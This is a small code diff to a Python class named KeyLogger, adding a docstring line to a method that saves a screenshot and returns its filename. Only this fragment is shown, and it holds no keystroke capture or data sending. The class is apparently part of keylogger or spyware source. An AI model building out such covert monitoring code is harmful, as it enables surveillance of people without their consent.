@@ -48,6 +48,7 @@ class KeyLogger:
     def __screenshot(self):
         """
         Takes screenshot of computer and saves it to the defined file
+        return: filename of image taken
         """
         self.camera.grab_to_file(self.imgage_name)
         return self.imgage_name
